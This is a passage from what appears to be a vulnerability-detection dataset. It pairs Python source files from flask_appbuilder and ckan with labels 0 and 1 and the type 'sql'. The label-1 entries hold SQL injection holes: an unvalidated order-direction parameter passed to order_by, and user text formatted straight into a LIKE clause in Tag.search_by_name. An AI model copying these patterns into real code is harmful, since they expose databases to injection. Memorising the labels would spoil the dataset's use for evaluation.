str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete(self, item):\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete_all(self, items):\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    \"\"\"\n    -----------------------\n     FILE HANDLING METHODS\n    -----------------------\n    \"\"\"\n\n    def _add_files(self, this_request, item):\n        fm = FileManager()\n        im = ImageManager()\n        for file_col in this_request.files:\n            if self.is_file(file_col):\n                fm.save_file(this_request.files[file_col], getattr(item, file_col))\n        for file_col in this_request.files:\n            if self.is_image(file_col):\n                im.save_file(this_request.files[file_col], getattr(item, file_col))\n\n    def _delete_files(self, item):\n        for file_col in self.get_file_column_list():\n            if self.is_file(file_col):\n                if getattr(item, file_col):\n                    fm = FileManager()\n                    fm.delete_file(getattr(item, file_col))\n        for file_col in self.get_image_column_list():\n            if self.is_image(file_col):\n                if getattr(item, file_col):\n                    im = ImageManager()\n                    im.delete_file(getattr(item, file_col))\n\n    \"\"\"\n    ------------------------------\n     FUNCTIONS FOR RELATED MODELS\n    ------------------------------\n    \"\"\"\n\n    def get_col_default(self, col_name):\n        default = getattr(self.list_columns[col_name], 'default', None)\n        if default is not None:\n            value = getattr(default, 'arg', None)\n            if value is not None:\n                if getattr(default, 'is_callable', False):\n                    return lambda: default.arg(None)\n                else:\n                    if not getattr(default, 'is_scalar', True):\n                        return None\n                return value\n\n    def get_related_model(self, col_name):\n        return self.list_properties[col_name].mapper.class_\n\n    def query_model_relation(self, col_name):\n        model = self.get_related_model(col_name)\n        return self.session.query(model).all()\n\n    def get_related_interface(self, col_name):\n        return self.__class__(self.get_related_model(col_name), self.session)\n\n    def get_related_obj(self, col_name, value):\n        rel_model = self.get_related_model(col_name)\n        return self.session.query(rel_model).get(value)\n\n    def get_related_fks(self, related_views):\n        return [view.datamodel.get_related_fk(self.obj) for view in related_views]\n\n    def get_related_fk(self, model):\n        for col_name in self.list_properties.keys():\n            if self.is_relation(col_name):\n                if model == self.get_related_model(col_name):\n                    return col_name\n\n    \"\"\"\n    ------------- \n     GET METHODS\n    -------------\n    \"\"\"\n\n    def get_columns_list(self):\n        \"\"\"\n            Returns all model's columns on SQLA properties\n        \"\"\"\n        return list(self.list_properties.keys())\n\n    def get_user_columns_list(self):\n        \"\"\"\n            Returns all model's columns except pk or fk\n        \"\"\"\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):\n                ret_lst.append(col_name)\n        return ret_lst\n\n    # TODO get different solution, more integrated with filters\n    def get_search_columns_list(self):\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if not self.is_relation(col_name):\n                tmp_prop = self.get_property_first_col(col_name).name\n                if (not self.is_pk(tmp_prop)) and \\\n                        (not self.is_fk(tmp_prop)) and \\\n                        (not self.is_image(col_name)) and \\\n                        (not self.is_file(col_name)) and \\\n                        (not self.is_boolean(col_name)):\n                    ret_lst.append(col_name)\n            else:\n                ret_lst.append(col_name)\n        return ret_lst\n\n    def get_order_columns_list(self, list_columns=None):\n        \"\"\"\n            Returns the columns that can be ordered\n\n            :param list_columns: optional list of columns name, if provided will\n                use this list only.\n        \"\"\"\n        ret_lst = list()\n        list_columns = list_columns or self.get_columns_list()\n        for col_name in list_columns:\n            if not self.is_relation(col_name):\n                if hasattr(self.obj, col_name):\n                    if (not hasattr(getattr(self.obj, col_name), '__call__') or\n                            hasattr(getattr(self.obj, col_name), '_col_name')):\n                        ret_lst.append(col_name)\n                else:\n                    ret_lst.append(col_name)\n        return ret_lst\n\n    def get_file_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]\n\n    def get_image_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]\n\n    def get_property_first_col(self, col_name):\n        # support for only one col for pk and fk\n        return self.list_properties[col_name].columns[0]\n\n    def get_relation_fk(self, col_name):\n        # support for only one col for pk and fk\n        return list(self.list_properties[col_name].local_columns)[0]\n\n    def get(self, id, filters=None):\n        if filters:\n            query = query = self.session.query(self.obj)\n            _filters = filters.copy()\n            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)\n            query = self._get_base_query(query=query, filters=_filters)\n            return query.first()\n        return self.session.query(self.obj).get(id)\n\n    def get_pk_name(self):\n        for col_name in self.list_columns.keys():\n            if self.is_pk(col_name):\n                return col_name\n\n\n\"\"\"\n    For Retro-Compatibility\n\"\"\"\nSQLModel = SQLAInterface\n/n/n/nflask_appbuilder/urltools.py/n/nimport re\nfrom flask import request\n\n\nclass Stack(object):\n    \"\"\"\n        Stack data structure will not insert\n        equal sequential data\n    \"\"\"\n    def __init__(self, list=None, size=5):\n        self.size = size\n        self.data = list or []\n\n    def push(self, item):\n        if self.data:\n            if item != self.data[len(self.data) - 1]:\n                self.data.append(item)\n        else:\n            self.data.append(item)\n        if len(self.data) > self.size:\n            self.data.pop(0)\n\n    def pop(self):\n        if len(self.data) == 0:\n            return None\n        return self.data.pop(len(self.data) - 1)\n\n    def to_json(self):\n        return self.data\n\n\ndef get_group_by_args():\n    \"\"\"\n        Get page arguments for group by\n    \"\"\"\n    group_by = request.args.get('group_by')\n    if not group_by: group_by = ''\n    return group_by\n\n\ndef get_page_args():\n    \"\"\"\n        Get page arguments, returns a dictionary\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>\n\n    \"\"\"\n    pages = {}\n    for arg in request.args:\n        re_match = re.findall('page_(.*)', arg)\n        if re_match:\n            pages[re_match[0]] = int(request.args.get(arg))\n    return pages\n\n\ndef get_page_size_args():\n    \"\"\"\n        Get page size arguments, returns an int\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>\n\n    \"\"\"\n    page_sizes = {}\n    for arg in request.args:\n        re_match = re.findall('psize_(.*)', arg)\n        if re_match:\n            page_sizes[re_match[0]] = int(request.args.get(arg))\n    return page_sizes\n\n\ndef get_order_args():\n    \"\"\"\n        Get order arguments, return a dictionary\n        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }\n\n        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'\n\n    \"\"\"\n    orders = {}\n    for arg in request.args:\n        re_match = re.findall('_oc_(.*)', arg)\n        if re_match:\n            order_direction = request.args.get('_od_' + re_match[0])\n            if order_direction in ('asc', 'desc'):\n                orders[re_match[0]] = (request.args.get(arg), order_direction)\n    return orders\n\n\ndef get_filter_args(filters):\n    filters.clear_filters()\n    for arg in request.args:\n        re_match = re.findall('_flt_(\\d)_(.*)', arg)\n        if re_match:\n            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))\n/n/n/n", "label": 0, "vtype": "sql"}, {"id": "2158db051408e0d66210a99b17c121be008e20b6", "code": "/flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-\nimport sys\nimport logging\nimport sqlalchemy as sa\n\nfrom . import filters\nfrom sqlalchemy.orm import joinedload\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy import func\nfrom sqlalchemy.orm.properties import SynonymProperty\n\nfrom ..base import BaseInterface\nfrom ..group import GroupByDateYear, GroupByDateMonth, GroupByCol\nfrom ..mixins import FileColumn, ImageColumn\nfrom ...filemanager import FileManager, ImageManager\nfrom ..._compat import as_unicode\nfrom ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \\\n    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY\n\nlog = logging.getLogger(__name__)\n\n\ndef _include_filters(obj):\n    for key in filters.__all__:\n        if not hasattr(obj, key):\n            setattr(obj, key, getattr(filters, key))\n\n\nclass SQLAInterface(BaseInterface):\n    \"\"\"\n    SQLAModel\n    Implements SQLA support methods for views\n    \"\"\"\n    session = None\n\n    filter_converter_class = filters.SQLAFilterConverter\n\n    def __init__(self, obj, session=None):\n        _include_filters(self)\n        self.list_columns = dict()\n        self.list_properties = dict()\n\n        self.session = session\n        # Collect all SQLA columns and properties\n        for prop in sa.orm.class_mapper(obj).iterate_properties:\n            if type(prop) != SynonymProperty:\n                self.list_properties[prop.key] = prop\n        for col_name in obj.__mapper__.columns.keys():\n            if col_name in self.list_properties:\n                self.list_columns[col_name] = obj.__mapper__.columns[col_name]\n        super(SQLAInterface, self).__init__(obj)\n\n    @property\n    def model_name(self):\n        \"\"\"\n            Returns the models class name\n            useful for auto title on views\n        \"\"\"\n        return self.obj.__name__\n\n    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):\n        if filters:\n            query = filters.apply_all(query)\n        if order_column != '':\n            # if Model has custom decorator **renders('<COL_NAME>')**\n            # this decorator will add a property to the method named *_col_name*\n            if hasattr(self.obj, order_column):\n                if hasattr(getattr(self.obj, order_column), '_col_name'):\n                    order_column = getattr(getattr(self.obj, order_column), '_col_name')\n            query = query.order_by(order_column + ' ' + order_direction)\n        return query\n\n    def query(self, filters=None, order_column='', order_direction='',\n              page=None, page_size=None):\n        \"\"\"\n            QUERY\n            :param filters:\n                dict with filters {<col_name>:<value,...}\n            :param order_column:\n                name of the column to order\n            :param order_direction:\n                the direction to order <'asc'|'desc'>\n            :param page:\n                the current page\n            :param page_size:\n                the current page size\n\n        \"\"\"\n        query = self.session.query(self.obj)\n        if len(order_column.split('.')) >= 2:\n            tmp_order_column = ''\n            for join_relation in order_column.split('.')[:-1]:\n                model_relation = self.get_related_model(join_relation)\n                query = query.join(model_relation)\n                # redefine order column name, because relationship can have a different name\n                # from the related table name.\n                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'\n            order_column = tmp_order_column + order_column.split('.')[-1]\n        query_count = self.session.query(func.count('*')).select_from(self.obj)\n\n        query_count = self._get_base_query(query=query_count,\n                                           filters=filters)\n        query = self._get_base_query(query=query,\n                                     filters=filters,\n                                     order_column=order_column,\n                                     order_direction=order_direction)\n\n        count = query_count.scalar()\n\n        if page:\n            query = query.offset(page * page_size)\n        if page_size:\n            query = query.limit(page_size)\n\n        return count, query.all()\n\n    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByCol(group_by, 'Group by')\n        return group.apply(query_result)\n\n    def query_month_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByDateMonth(group_by, 'Group by Month')\n        return group.apply(query_result)\n\n    def query_year_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group_year = GroupByDateYear(group_by, 'Group by Year')\n        return group_year.apply(query_result)\n\n    \"\"\"\n    -----------------------------------------\n         FUNCTIONS for Testing TYPES\n    -----------------------------------------\n    \"\"\"\n\n    def is_image(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, ImageColumn)\n        except:\n            return False\n\n    def is_file(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, FileColumn)\n        except:\n            return False\n\n    def is_string(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.String)\n        except:\n            return False\n\n    def is_text(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Text)\n        except:\n            return False\n\n    def is_integer(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Integer)\n        except:\n            return False\n\n    def is_numeric(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)\n        except:\n            return False\n\n    def is_float(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Float)\n        except:\n            return False\n\n    def is_boolean(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)\n        except:\n            return False\n\n    def is_date(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Date)\n        except:\n            return False\n\n    def is_datetime(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)\n        except:\n            return False\n\n    def is_relation(self, col_name):\n        try:\n            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)\n        except:\n            return False\n\n    def is_relation_many_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOONE'\n        except:\n            return False\n\n    def is_relation_many_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOMANY'\n        except:\n            return False\n\n    def is_relation_one_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOONE'\n        except:\n            return False\n\n    def is_relation_one_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOMANY'\n        except:\n            return False\n\n    def is_nullable(self, col_name):\n        if self.is_relation_many_to_one(col_name):\n            col = self.get_relation_fk(col_name)\n            return col.nullable\n        try:\n            return self.list_columns[col_name].nullable\n        except:\n            return False\n\n    def is_unique(self, col_name):\n        try:\n            return self.list_columns[col_name].unique\n        except:\n            return False\n\n    def is_pk(self, col_name):\n        try:\n            return self.list_columns[col_name].primary_key\n        except:\n            return False\n\n    def is_fk(self, col_name):\n        try:\n            return self.list_columns[col_name].foreign_keys\n        except:\n            return False\n\n    def get_max_length(self, col_name):\n        try:\n            col = self.list_columns[col_name]\n            if col.type.length:\n                return col.type.length\n            else:\n                return -1\n        except:\n            return -1\n\n    \"\"\"\n    -------------------------------\n     FUNCTIONS FOR CRUD OPERATIONS\n    -------------------------------\n    \"\"\"\n\n    def add(self, item):\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def edit(self, item):\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete(self, item):\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete_all(self, items):\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    \"\"\"\n    -----------------------\n     FILE HANDLING METHODS\n    -----------------------\n    \"\"\"\n\n    def _add_files(self, this_request, item):\n        fm = FileManager()\n        im = ImageManager()\n        for file_col in this_request.files:\n            if self.is_file(file_col):\n                fm.save_file(this_request.files[file_col], getattr(item, file_col))\n        for file_col in this_request.files:\n            if self.is_image(file_col):\n                im.save_file(this_request.files[file_col], getattr(item, file_col))\n\n    def _delete_files(self, item):\n        for file_col in self.get_file_column_list():\n            if self.is_file(file_col):\n                if getattr(item, file_col):\n                    fm = FileManager()\n                    fm.delete_file(getattr(item, file_col))\n        for file_col in self.get_image_column_list():\n            if self.is_image(file_col):\n                if getattr(item, file_col):\n                    im = ImageManager()\n                    im.delete_file(getattr(item, file_col))\n\n    \"\"\"\n    ------------------------------\n     FUNCTIONS FOR RELATED MODELS\n    ------------------------------\n    \"\"\"\n\n    def get_col_default(self, col_name):\n        default = getattr(self.list_columns[col_name], 'default', None)\n        if default is not None:\n            value = getattr(default, 'arg', None)\n            if value is not None:\n                if getattr(default, 'is_callable', False):\n                    return lambda: default.arg(None)\n                else:\n                    if not getattr(default, 'is_scalar', True):\n                        return None\n                return value\n\n    def get_related_model(self, col_name):\n        return self.list_properties[col_name].mapper.class_\n\n    def query_model_relation(self, col_name):\n        model = self.get_related_model(col_name)\n        return self.session.query(model).all()\n\n    def get_related_interface(self, col_name):\n        return self.__class__(self.get_related_model(col_name), self.session)\n\n    def get_related_obj(self, col_name, value):\n        rel_model = self.get_related_model(col_name)\n        return self.session.query(rel_model).get(value)\n\n    def get_related_fks(self, related_views):\n        return [view.datamodel.get_related_fk(self.obj) for view in related_views]\n\n    def get_related_fk(self, model):\n        for col_name in self.list_properties.keys():\n            if self.is_relation(col_name):\n                if model == self.get_related_model(col_name):\n                    return col_name\n\n    \"\"\"\n    ------------- \n     GET METHODS\n    -------------\n    \"\"\"\n\n    def get_columns_list(self):\n        \"\"\"\n            Returns all model's columns on SQLA properties\n        \"\"\"\n        return list(self.list_properties.keys())\n\n    def get_user_columns_list(self):\n        \"\"\"\n            Returns all model's columns except pk or fk\n        \"\"\"\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):\n                ret_lst.append(col_name)\n        return ret_lst\n\n    # TODO get different solution, more integrated with filters\n    def get_search_columns_list(self):\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if not self.is_relation(col_name):\n                tmp_prop = self.get_property_first_col(col_name).name\n                if (not self.is_pk(tmp_prop)) and \\\n                        (not self.is_fk(tmp_prop)) and \\\n                        (not self.is_image(col_name)) and \\\n                        (not self.is_file(col_name)) and \\\n                        (not self.is_boolean(col_name)):\n                    ret_lst.append(col_name)\n            else:\n                ret_lst.append(col_name)\n        return ret_lst\n\n    def get_order_columns_list(self, list_columns=None):\n        \"\"\"\n            Returns the columns that can be ordered\n\n            :param list_columns: optional list of columns name, if provided will\n                use this list only.\n        \"\"\"\n        ret_lst = list()\n        list_columns = list_columns or self.get_columns_list()\n        for col_name in list_columns:\n            if not self.is_relation(col_name):\n                if hasattr(self.obj, col_name):\n                    if (not hasattr(getattr(self.obj, col_name), '__call__') or\n                            hasattr(getattr(self.obj, col_name), '_col_name')):\n                        ret_lst.append(col_name)\n                else:\n                    ret_lst.append(col_name)\n        return ret_lst\n\n    def get_file_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]\n\n    def get_image_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]\n\n    def get_property_first_col(self, col_name):\n        # support for only one col for pk and fk\n        return self.list_properties[col_name].columns[0]\n\n    def get_relation_fk(self, col_name):\n        # support for only one col for pk and fk\n        return list(self.list_properties[col_name].local_columns)[0]\n\n    def get(self, id, filters=None):\n        if filters:\n            query = query = self.session.query(self.obj)\n            _filters = filters.copy()\n            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)\n            query = self._get_base_query(query=query, filters=_filters)\n            return query.first()\n        return self.session.query(self.obj).get(id)\n\n    def get_pk_name(self):\n        for col_name in self.list_columns.keys():\n            if self.is_pk(col_name):\n                return col_name\n\n\n\"\"\"\n    For Retro-Compatibility\n\"\"\"\nSQLModel = SQLAInterface\n/n/n/n/flask_appbuilder/urltools.py/n/nimport re\nfrom flask import request\n\n\nclass Stack(object):\n    \"\"\"\n        Stack data structure will not insert\n        equal sequential data\n    \"\"\"\n    def __init__(self, list=None, size=5):\n        self.size = size\n        self.data = list or []\n\n    def push(self, item):\n        if self.data:\n            if item != self.data[len(self.data) - 1]:\n                self.data.append(item)\n        else:\n            self.data.append(item)\n        if len(self.data) > self.size:\n            self.data.pop(0)\n\n    def pop(self):\n        if len(self.data) == 0:\n            return None\n        return self.data.pop(len(self.data) - 1)\n\n    def to_json(self):\n        return self.data\n\ndef get_group_by_args():\n    \"\"\"\n        Get page arguments for group by\n    \"\"\"\n    group_by = request.args.get('group_by')\n    if not group_by: group_by = ''\n    return group_by\n\ndef get_page_args():\n    \"\"\"\n        Get page arguments, returns a dictionary\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>\n\n    \"\"\"\n    pages = {}\n    for arg in request.args:\n        re_match = re.findall('page_(.*)', arg)\n        if re_match:\n            pages[re_match[0]] = int(request.args.get(arg))\n    return pages\n\ndef get_page_size_args():\n    \"\"\"\n        Get page size arguments, returns an int\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>\n\n    \"\"\"\n    page_sizes = {}\n    for arg in request.args:\n        re_match = re.findall('psize_(.*)', arg)\n        if re_match:\n            page_sizes[re_match[0]] = int(request.args.get(arg))\n    return page_sizes\n\ndef get_order_args():\n    \"\"\"\n        Get order arguments, return a dictionary\n        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }\n\n        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'\n\n    \"\"\"\n    orders = {}\n    for arg in request.args:\n        re_match = re.findall('_oc_(.*)', arg)\n        if re_match:\n            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))\n    return orders\n\ndef get_filter_args(filters):\n    filters.clear_filters()\n    for arg in request.args:\n        re_match = re.findall('_flt_(\\d)_(.*)', arg)\n        if re_match:\n            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))\n/n/n/n", "label": 1, "vtype": "sql"}, {"id": "f020853c54a1851f196d7fd8897c4620bccf9f6c", "code": "ckan/models/package.py/n/nimport sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query = str(text_query) # SQLObject chokes on unicode.\n        return self.select(self.q.name.contains(text_query.lower()))\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n/n/n/n", "label": 0, "vtype": "sql"}, {"id": "f020853c54a1851f196d7fd8897c4620bccf9f6c", "code": "/ckan/models/package.py/n/nimport sqlobject\n\ntry:\n    # vdm >= 0.2\n    import vdm.sqlobject.base as vdmbase\n    from vdm.sqlobject.base import State\nexcept:\n    # vdm == 0.1\n    import vdm.base as vdmbase\n    from vdm.base import State\n\n# American spelling ...\nclass License(sqlobject.SQLObject):\n\n    class sqlmeta:\n        _defaultOrder = 'name'\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    packages = sqlobject.MultipleJoin('Package')\n\n\nclass PackageRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Package', cascade=True)\n    title = sqlobject.UnicodeCol(default=None)\n    url = sqlobject.UnicodeCol(default=None)\n    download_url = sqlobject.UnicodeCol(default=None)\n    license = sqlobject.ForeignKey('License', default=None)\n    notes = sqlobject.UnicodeCol(default=None)\n\n\nclass TagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('Tag', cascade=True)\n\n\nclass PackageTagRevision(vdmbase.ObjectRevisionSQLObject):\n\n    base = sqlobject.ForeignKey('PackageTag', cascade=True)\n\n\nclass Package(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    \n    name = sqlobject.UnicodeCol(alternateID=True)\n\n    # should be attribute_name, module_name, module_object\n    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]\n\n    def add_tag_by_name(self, tagname):\n        try:\n            tag = self.revision.model.tags.get(tagname)\n        except: # TODO: make this specific\n            tag = self.transaction.model.tags.create(name=tagname)\n        self.tags.create(tag=tag)\n\n\nclass Tag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = TagRevision\n\n    name = sqlobject.UnicodeCol(alternateID=True)\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n\n    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]\n\n    @classmethod\n    def search_by_name(self, text_query):\n        text_query_str = str(text_query) # SQLObject chokes on unicode.\n        # Todo: Change to use SQLObject statement objects.\n        sql_query = \"UPPER(tag.name) LIKE UPPER('%%%s%%')\" % text_query_str\n        return self.select(sql_query)\n\n\nclass PackageTag(vdmbase.VersionedDomainObject):\n\n    sqlobj_version_class = PackageTagRevision\n    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)\n    m2m = []\n\n    package = sqlobject.ForeignKey('Package', cascade=True)\n    tag = sqlobject.ForeignKey('Tag', cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n/n/n/n", "label": 1, "vtype": "sql"}, {"id": "91513ef7bbe60014dacab709be582eb0b10fcaab", "code": "crapo_tests/models/crm_stage.py/n/n\"\"\"\n\u00a92019\nLicense: AGPL-3\n\n@author: C. Guychard (Article 714)\n\n\"\"\"\n\n\nfrom odoo import models, api\nfrom psycopg2.sql import SQL, Identifier\nfrom odoo.addons.base_crapo_workflow.mixins import 